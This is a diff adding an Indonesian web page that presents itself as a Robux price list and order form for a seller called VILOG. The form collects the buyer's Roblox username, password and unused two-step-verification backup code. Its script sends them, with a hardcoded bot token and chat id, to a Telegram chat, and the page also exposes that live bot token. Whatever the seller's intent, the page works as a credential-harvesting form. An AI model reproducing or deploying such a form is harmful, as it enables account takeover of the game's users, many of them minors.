@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pricelist & Form Pembelian Robux - VILOG</title>
+  <!-- Import font Roboto -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+      color: #333;
+      font-size: 13px;
+    }
+
+    /* Pricelist */
+    .category {
+      max-width: 720px;
+      margin: 25px auto;
+      padding: 5px 12px;
+    }
+    .category h3 {
+      text-align: center;
+      margin-bottom: 10px;
+      font-size: 15px;
+      font-weight: 700;
+      color: #2c3e50;
+    }
+    .pricelist-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      justify-content: center;
+    }
+    .price-box {
+      flex: 0 1 calc(33.33% - 8px);
+      background-color: #f9f9f9;
+      border: 1px solid #d1d9e6;
+      border-radius: 8px;
+      padding: 6px 4px;
+      text-align: center;
+      font-size: 11px;
+      font-weight: 500;
+      color: #333;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .price-box:hover {
+      background-color: #eef3fa;
+      border-color: #4a6fa1;
+      transform: scale(1.04);
+    }
+    .price-box span {
+      display: block;
+      font-weight: normal;
+      font-size: 10px;
+      color: #555;
+      margin-top: 2px;
+    }
+
+    /* Form */
+    .form-container {
+      max-width: 400px;
+      margin: 20px auto 40px;
+      background: #fafafa;
+      border: 1px solid #d1d9e6;
+      border-radius: 10px;
+      padding: 16px 18px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 14px;
+      font-size: 15px;
+      font-weight: 700;
+      color: #2c3e50;
+    }
+    .form-group {
+      margin-bottom: 10px;
+    }
+    label {
+      font-size: 12px;
+      font-weight: 500;
+      display: block;
+      margin-bottom: 3px;
+      color: #444;
+    }
+    input, select {
+      width: 100%;
+      padding: 7px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 12px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 9px;
+      background: #4a6fa1;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    button:hover {
+      background: #3a5f8a;
+    }
+    .hidden { display: none; }
+    .notes {
+      font-size: 11px;
+      color: #666;
+      margin-top: 3px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Robux Reguler -->
+  <div class="category">
+    <h3>Robux Reguler</h3>
+    <div class="pricelist-container">
+      <div class="price-box" onclick="isiForm('80 Robux','15000','Reguler')">80 Robux<span>Rp15.000</span></div>
+      <div class="price-box" onclick="isiForm('160 Robux','30000','Reguler')">160 Robux<span>Rp30.000</span></div>
+      <div class="price-box" onclick="isiForm('240 Robux','44500','Reguler')">240 Robux<span>Rp44.500</span></div>
+      <div class="price-box" onclick="isiForm('320 Robux','58000','Reguler')">320 Robux<span>Rp58.000</span></div>
+      <div class="price-box" onclick="isiForm('400 Robux','70000','Reguler')">400 Robux<span>Rp70.000</span></div>
+      <div class="price-box" onclick="isiForm('480 Robux','85500','Reguler')">480 Robux<span>Rp85.500</span></div>
+      <div class="price-box" onclick="isiForm('560 Robux','99800','Reguler')">560 Robux<span>Rp99.800</span></div>
+      <div class="price-box" onclick="isiForm('640 Robux','114000','Reguler')">640 Robux<span>Rp114.000</span></div>
+      <div class="price-box" onclick="isiForm('720 Robux','128000','Reguler')">720 Robux<span>Rp128.000</span></div>
+      <div class="price-box" onclick="isiForm('800 Robux','139000','Reguler')">800 Robux<span>Rp139.000</span></div>
+      <div class="price-box" onclick="isiForm('1700 Robux','278000','Reguler')">1.700 Robux<span>Rp278.000</span></div>
+      <div class="price-box" onclick="isiForm('2100 Robux','374000','Reguler')">2.100 Robux<span>Rp374.000</span></div>
+      <div class="price-box" onclick="isiForm('10000 Robux','1390000','Reguler')">10.000 Robux<span>Rp1.390.000</span></div>
+      <div class="price-box" onclick="isiForm('22500 Robux','2780000','Reguler')">22.500 Robux<span>Rp2.780.000</span></div>
+    </div>
+  </div>
+
+  <!-- Robux Special -->
+  <div class="category">
+    <h3>Robux Special</h3>
+    <div class="pricelist-container">
+      <div class="price-box" onclick="isiForm('500 Robux','74000','Special')">500 Robux<span>Rp74.000</span></div>
+      <div class="price-box" onclick="isiForm('1000 Robux','148000','Special')">1.000 Robux<span>Rp148.000</span></div>
+      <div class="price-box" onclick="isiForm('1500 Robux','222000','Special')">1.500 Robux<span>Rp222.000</span></div>
+      <div class="price-box" onclick="isiForm('2000 Robux','296000','Special')">2.000 Robux<span>Rp296.000</span></div>
+      <div class="price-box" onclick="isiForm('2500 Robux','370000','Special')">2.500 Robux<span>Rp370.000</span></div>
+      <div class="price-box" onclick="isiForm('3000 Robux','444000','Special')">3.000 Robux<span>Rp444.000</span></div>
+      <div class="price-box" onclick="isiForm('3500 Robux','518000','Special')">3.500 Robux<span>Rp518.000</span></div>
+      <div class="price-box" onclick="isiForm('4000 Robux','592000','Special')">4.000 Robux<span>Rp592.000</span></div>
+      <div class="price-box" onclick="isiForm('5000 Robux','740000','Special')">5.000 Robux<span>Rp740.000</span></div>
+      <div class="price-box" onclick="isiForm('6000 Robux','882000','Special')">6.000 Robux<span>Rp882.000</span></div>
+    </div>
+  </div>
+
+  <!-- Robux Premium -->
+  <div class="category">
+    <h3>Robux Premium</h3>
+    <div class="pricelist-container">
+      <div class="price-box" onclick="isiForm('450 Robux + Premium','74000','Premium')">450 Robux + Premium<span>Rp74.000</span></div>
+      <div class="price-box" onclick="isiForm('1000 Robux + Premium','148000','Premium')">1.000 Robux + Premium<span>Rp148.000</span></div>
+      <div class="price-box" onclick="isiForm('1550 Robux + Premium','222000','Premium')">1.550 Robux + Premium<span>Rp222.000</span></div>
+      <div class="price-box" onclick="isiForm('2200 Robux + Premium','296000','Premium')">2.200 Robux + Premium<span>Rp296.000</span></div>
+      <div class="price-box" onclick="isiForm('2650 Robux + Premium','370000','Premium')">2.650 Robux + Premium<span>Rp370.000</span></div>
+      <div class="price-box" onclick="isiForm('3300 Robux + Premium','444000','Premium')">3.300 Robux + Premium<span>Rp444.000</span></div>
+    </div>
+  </div>
+
+  <!-- Form -->
+  <div class="form-container">
+    <h2>Formulir Pembelian Robux VILOG</h2>
+    <form id="orderForm">
+      <div class="form-group">
+        <label for="seller">Username Telegram Seller *</label>
+        <input type="text" id="seller" name="seller" placeholder="@username_seller" required>
+      </div>
+      <div class="form-group">
+        <label for="nama">Nama / Inisial *</label>
+        <input type="text" id="nama" name="nama" placeholder="Masukkan nama / inisial" required>
+      </div>
+      <div class="form-group">
+        <label for="username">Username Roblox *</label>
+        <input type="text" id="username" name="username" placeholder="Username Roblox" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password Roblox *</label>
+        <input type="password" id="password" name="password" placeholder="Password Roblox" required>
+      </div>
+      <div class="form-group">
+        <label for="v2l">Verifikasi 2 Langkah (V2L) *</label>
+        <select id="v2l" name="v2l" required>
+          <option value="">-- Pilih Status --</option>
+          <option value="OFF">Nonaktif (OFF)</option>
+          <option value="ON">Aktif (ON)</option>
+        </select>
+      </div>
+      <div class="form-group hidden" id="metodeV2L_div">
+        <label for="metodeV2L">Pilih Metode V2L *</label>
+        <select id="metodeV2L" name="metodeV2L">
+          <option value="">-- Pilih Metode --</option>
+          <option value="Backup Code">Backup Code</option>
+          <option value="Kode Email">Kode Email</option>
+        </select>
+      </div>
+      <div class="form-group hidden" id="backupCode_div">
+        <label for="backupCode">Masukkan Backup Code *</label>
+        <input type="text" id="backupCode" name="backupCode" placeholder="Isi Backup Code">
+        <div class="notes">Masukkan backup code yang belum pernah digunakan.</div>
+      </div>
+      <div class="form-group hidden" id="emailNote_div">
+        <div class="notes">Pastikan storage email tidak penuh supaya bisa menerima kode V2L.</div>
+      </div>
+      <div class="form-group">
+        <label for="kategori">Kategori Robux *</label>
+        <input type="text" id="kategori" name="kategori" readonly required>
+      </div>
+      <div class="form-group">
+        <label for="nominal">Jumlah Order *</label>
+        <input type="text" id="nominal" name="nominal" readonly required>
+      </div>
+      <div class="form-group">
+        <label for="harga">Harga *</label>
+        <input type="text" id="harga" name="harga" readonly required>
+      </div>
+      <div style="text-align:center; margin: 14px 0 6px;">
+        <button type="button" id="btnWa">Pesan via Telegram</button>
+      </div>
+    </form>
+  </div>
+
+<script>
+function isiForm(nominal, harga, kategori) {
+  document.getElementById("nominal").value = nominal;
+  document.getElementById("harga").value = "Rp" + new Intl.NumberFormat('id-ID').format(harga);
+  document.getElementById("kategori").value = kategori;
+}
+
+// V2L logic
+document.getElementById("v2l").addEventListener("change", function() {
+  if (this.value === "ON") {
+    document.getElementById("metodeV2L_div").classList.remove("hidden");
+  } else {
+    document.getElementById("metodeV2L_div").classList.add("hidden");
+    document.getElementById("backupCode_div").classList.add("hidden");
+    document.getElementById("emailNote_div").classList.add("hidden");
+  }
+});
+
+document.getElementById("metodeV2L").addEventListener("change", function() {
+  if (this.value === "Backup Code") {
+    document.getElementById("backupCode_div").classList.remove("hidden");
+    document.getElementById("emailNote_div").classList.add("hidden");
+  } else if (this.value === "Kode Email") {
+    document.getElementById("emailNote_div").classList.remove("hidden");
+    document.getElementById("backupCode_div").classList.add("hidden");
+  } else {
+    document.getElementById("backupCode_div").classList.add("hidden");
+    document.getElementById("emailNote_div").classList.add("hidden");
+  }
+});
+
+// Kirim via Telegram
+document.getElementById("btnWa").addEventListener("click", function() {
+  const form = document.getElementById("orderForm");
+  const inputs = form.querySelectorAll("input[required], select[required]");
+  for (const input of inputs) {
+    if (!input.value.trim()) {
+      alert("Harap isi semua kolom yang wajib diisi!");
+      input.focus();
+      return;
+    }
+  }
+
+  let seller = document.getElementById("seller").value;
+  let nama = document.getElementById("nama").value;
+  let username = document.getElementById("username").value;
+  let password = document.getElementById("password").value;
+  let v2l = document.getElementById("v2l").value;
+  let metodeV2L = document.getElementById("metodeV2L").value;
+  let backupCode = document.getElementById("backupCode").value;
+  let kategori = document.getElementById("kategori").value;
+  let nominal = document.getElementById("nominal").value;
+  let harga = document.getElementById("harga").value;
+
+  let pesan = `📋 *Order Robux VILOG* 📋\n\n` +
+              `👤 Seller: ${seller}\n` +
+              `Nama: ${nama}\n` +
+              `Username: ${username}\n` +
+              `Password: ${password}\n` +
+              `V2L: ${v2l}\n` +
+              (v2l === "ON" ? `➡️ Metode V2L: ${metodeV2L}\n` : "") +
+              (metodeV2L === "Backup Code" ? `🔐 Backup Code: ${backupCode}\n` : "") +
+              `Kategori: ${kategori}\n` +
+              `Nominal: ${nominal}\n` +
+              `Harga: ${harga}`;
+
+  let token = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";
+  let chat_id = "4935292911";
+  let url = `https://api.telegram.org/bot${token}/sendMessage`;
+  
+  fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: pesan,
+      parse_mode: "Markdown"
+    })
+  })
+  .then(response => {
+    if (response.ok) {
+      alert("Pesanan berhasil dikirim ke Telegram!");
+      form.reset();
+    } else {
+      alert("Gagal mengirim ke Telegram.");
+    }
+  })
+  .catch(error => {
+    alert("Terjadi kesalahan saat mengirim ke Telegram.");
+  });
+});
+</script>
+
+</body>
+</html>
